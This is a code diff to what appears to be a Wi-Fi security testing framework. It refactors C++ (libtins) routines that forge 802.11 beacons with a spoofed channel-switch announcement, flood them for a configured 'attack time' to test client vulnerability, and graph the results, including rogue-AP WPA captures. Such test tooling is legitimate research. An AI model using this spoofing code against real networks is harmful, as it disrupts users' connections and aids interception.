@@ -21,9 +21,8 @@ using namespace filesystem;
 using namespace Tins;
 using namespace chrono;
 
-void send_CSA_beacon(const HWAddress<6> &ap_mac, const NetworkInterface &iface, const string &ssid,
-					const Channel &ap_channel, const Channel &new_channel, const int switch_count
-){
+RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const string &ssid, const Channel &ap_channel,
+						const Channel &new_channel, const int switch_count){
 	Dot11Beacon beacon;
 	beacon.addr1(Dot11::BROADCAST);
 	beacon.addr2(ap_mac);
@@ -38,25 +37,24 @@ void send_CSA_beacon(const HWAddress<6> &ap_mac, const NetworkInterface &iface, 
 	beacon.channel_switch(cs);
 
 	RadioTap radiotap;
-	const int freq_mhz = hw_capabilities::channel_to_freq(ap_channel);
-	radiotap.channel(freq_mhz, RadioTap::OFDM);
+	//const int freq_mhz = hw_capabilities::channel_to_freq(ap_channel);
+	//radiotap.channel(freq_mhz, RadioTap::OFDM);
 	radiotap.inner_pdu(beacon);
-	radiotap.flags(RadioTap::FCS); // tell driver to check FCS (can be invalid for some drivers)
-
-	// TODO not very effective?
-	PacketSender sender;
-	sender.send(radiotap, iface);
+	//radiotap.flags(RadioTap::FCS); // tell driver to check FCS (can be invalid for some drivers)
+	return radiotap;
 }
 
-auto check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const string &iface_name,
+void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const string &iface_name,
 					const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
 					const int attack_time
-)->void{
+){
 	const NetworkInterface iface(iface_name);
 	const auto end_time = steady_clock::now() + seconds(attack_time);
 
+	PacketSender sender;
 	while(steady_clock::now() < end_time && !g_interrupted.load()){
-		send_CSA_beacon(ap_mac, iface, ssid, ap_channel, new_channel);
+		RadioTap csa_rt = get_CSA_beacon(ap_mac, ssid, ap_channel, new_channel);
+		sender.send(csa_rt, iface);
 		this_thread::sleep_for(milliseconds(ms_interval));
 	}
 
@@ -85,7 +83,7 @@ void run_chs_attack(RunStatus &rs){
 	const string iface_name = rs.get_actor("attacker")["iface"];
 	const string essid = ap_actor["ssid"];
 	const Channel old_channel = ap_actor->get_channel();
-	const Channel new_channel{att_cfg.at("new_channel").get<int>(), ap_actor->get_band(), ap_actor[SK::ht_mode]};
+	const Channel new_channel{att_cfg.at("new_channel").get<int>(), ap_actor->get_channel().band, ap_actor[SK::ht_mode]};
 	const int ms_interval = att_cfg.at("ms_interval");
 	const int attack_time = att_cfg.at("attack_time");
 
@@ -97,6 +95,8 @@ void run_chs_attack(RunStatus &rs){
 	check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
 	log(LogLevel::INFO, "Attack END");
 	interruptible_sleep(seconds(10));
+
+	rs.process_manager.stop_all();
 }
 
 // ---------- STATS ----------------
@@ -142,7 +142,6 @@ void stats_chs_attack(const RunStatus &rs){
 	if(rs.config().at("actors").contains("rogue_ap")){
 		elements.push_back(make_unique<EventLines>(get_time_logs(rs, "rogue_ap", "Captured a WPA"), "MANA", "black"));
 	}
-
 	const string STA_graph_path = observer::tshark::tshark_graph(rs, "client", elements);
 	const string AP_graph_path = observer::tshark::tshark_graph(rs, "access_point", elements,
 																observer::get_observer_folder(rs, "tcpdump"));
